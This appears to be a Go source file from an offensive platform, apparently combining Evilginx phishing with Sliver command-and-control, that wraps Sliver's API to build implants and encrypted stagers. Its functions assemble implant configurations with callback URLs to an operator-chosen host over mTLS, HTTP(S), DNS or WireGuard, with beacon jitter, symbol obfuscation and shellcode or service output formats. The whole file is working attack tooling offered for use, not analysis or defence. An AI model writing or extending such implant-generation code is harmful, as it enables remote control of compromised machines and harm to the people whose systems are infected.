package evilginx

import (
	"context"
	"fmt"

	"github.com/bishopfox/sliver/protobuf/clientpb"
)

// GenerateImplant - build a new implant profile/binary. Returns the compiled
// artifact bytes so the platform can persist or serve them.
func (s *SliverBridge) GenerateImplant(params ImplantParams) (*ImplantBuildResult, error) {
	c, err := s.requireClient()
	if err != nil {
		return nil, err
	}

	cfg, err := buildImplantConfig(params)
	if err != nil {
		return nil, err
	}

	resp, err := c.Generate(context.Background(), &clientpb.GenerateReq{
		Config: cfg,
		Name:   params.Name,
	})
	if err != nil {
		return nil, err
	}
	if resp.File == nil {
		return nil, fmt.Errorf("generate returned no artifact")
	}
	return &ImplantBuildResult{
		ImplantName:    resp.ImplantName,
		ImplantBuildID: resp.ImplantBuildID,
		ArtifactName:   resp.File.Name,
		Data:           resp.File.Data,
	}, nil
}

// GenerateStage - build a stager profile from an existing implant build id.
func (s *SliverBridge) GenerateStage(params StageParams) (*ImplantBuildResult, error) {
	c, err := s.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := c.GenerateStage(context.Background(), &clientpb.GenerateStageReq{
		Profile:      params.Profile,
		Name:         params.Name,
		AESEncryptKey: params.AESEncryptKey,
		AESEncryptIv:  params.AESEncryptIv,
		RC4EncryptKey: params.RC4EncryptKey,
		PrependSize:  params.PrependSize,
		CompressF:    params.CompressF,
		Compress:     params.Compress,
	})
	if err != nil {
		return nil, err
	}
	if resp.File == nil {
		return nil, fmt.Errorf("generate stage returned no artifact")
	}
	return &ImplantBuildResult{
		ImplantName:    resp.ImplantName,
		ImplantBuildID: resp.ImplantBuildID,
		ArtifactName:   resp.File.Name,
		Data:           resp.File.Data,
	}, nil
}

// ImplantParams - user-facing generate form.
type ImplantParams struct {
	Name          string `json:"name"`
	GOOS          string `json:"goos"`
	GOARCH        string `json:"goarch"`
	Format        string `json:"format"` // executable | shared | service | shellcode
	Transport     string `json:"transport"` // mtls | http | https | dns | wg
	LHost         string `json:"lhost"`
	LPort         int    `json:"lport"`
	IsBeacon      bool   `json:"is_beacon"`
	BeaconInterval int64  `json:"beacon_interval"` // seconds
	BeaconJitter  int64  `json:"beacon_jitter"`    // seconds
	MaxConnections uint32 `json:"max_connections"`
	ReconnectInterval int64 `json:"reconnect_interval"` // seconds
	ObfuscateSymbols  bool  `json:"obfuscate_symbols"`
	Debug             bool  `json:"debug"`
	HTTPC2ConfigName  string `json:"http_c2_config_name"` // HTTP C2 profile (defaults to "default")
}

// defaultHTTPC2Profile mirrors consts.DefaultC2Profile on the server; the
// server rejects builds whose HTTPC2ConfigName does not resolve to a saved
// profile (empty -> "record not found" NotFound).
const defaultHTTPC2Profile = "default"

// StageParams - user-facing stage build form.
type StageParams struct {
	Profile      string `json:"profile"`
	Name         string `json:"name"`
	AESEncryptKey string `json:"aes_encrypt_key"`
	AESEncryptIv  string `json:"aes_encrypt_iv"`
	RC4EncryptKey string `json:"rc4_encrypt_key"`
	PrependSize  bool   `json:"prepend_size"`
	CompressF    string `json:"compress_f"`
	Compress     string `json:"compress"`
}

// ImplantBuildResult - artifact returned by a build.
type ImplantBuildResult struct {
	ImplantName    string `json:"implant_name"`
	ImplantBuildID string `json:"implant_build_id"`
	ArtifactName   string `json:"artifact_name"`
	Data           []byte `json:"data"`
}

func buildImplantConfig(p ImplantParams) (*clientpb.ImplantConfig, error) {
	if p.Name == "" {
		return nil, fmt.Errorf("implant name is required")
	}
	if p.GOOS == "" {
		return nil, fmt.Errorf("goos is required")
	}
	if p.LHost == "" {
		return nil, fmt.Errorf("lhost is required")
	}
	if p.LPort == 0 {
		p.LPort = 443
	}

	httpC2Profile := p.HTTPC2ConfigName
	if httpC2Profile == "" {
		httpC2Profile = defaultHTTPC2Profile
	}

	var format clientpb.OutputFormat
	switch p.Format {
	case "executable", "exe", "":
		format = clientpb.OutputFormat_EXECUTABLE
	case "shared", "shared-lib":
		format = clientpb.OutputFormat_SHARED_LIB
	case "service":
		format = clientpb.OutputFormat_SERVICE
	case "shellcode":
		format = clientpb.OutputFormat_SHELLCODE
	case "third-party":
		format = clientpb.OutputFormat_THIRD_PARTY
	default:
		return nil, fmt.Errorf("unknown format: %s", p.Format)
	}

	cfg := &clientpb.ImplantConfig{
		GOOS:             p.GOOS,
		GOARCH:           p.GOARCH,
		Format:           format,
		IsBeacon:         p.IsBeacon,
		BeaconInterval:   p.BeaconInterval,
		BeaconJitter:     p.BeaconJitter,
		ReconnectInterval: p.ReconnectInterval,
		MaxConnectionErrors: p.MaxConnections,
		ObfuscateSymbols:   p.ObfuscateSymbols,
		Debug:              p.Debug,
		HTTPC2ConfigName:   httpC2Profile,
	}

	switch p.Transport {
	case "mtls":
		cfg.IncludeMTLS = true
		cfg.C2 = append(cfg.C2, &clientpb.ImplantC2{URL: fmt.Sprintf("mtls://%s:%d", p.LHost, p.LPort)})
	case "http":
		cfg.IncludeHTTP = true
		cfg.C2 = append(cfg.C2, &clientpb.ImplantC2{URL: fmt.Sprintf("http://%s:%d", p.LHost, p.LPort)})
	case "https":
		cfg.IncludeHTTP = true
		cfg.C2 = append(cfg.C2, &clientpb.ImplantC2{URL: fmt.Sprintf("https://%s:%d", p.LHost, p.LPort)})
	case "dns":
		cfg.IncludeDNS = true
		cfg.C2 = append(cfg.C2, &clientpb.ImplantC2{URL: fmt.Sprintf("dns://%s", p.LHost)})
	case "wg":
		cfg.IncludeWG = true
		cfg.C2 = append(cfg.C2, &clientpb.ImplantC2{URL: fmt.Sprintf("wg://%s:%d", p.LHost, p.LPort)})
	default:
		return nil, fmt.Errorf("unknown transport: %s", p.Transport)
	}
	return cfg, nil
}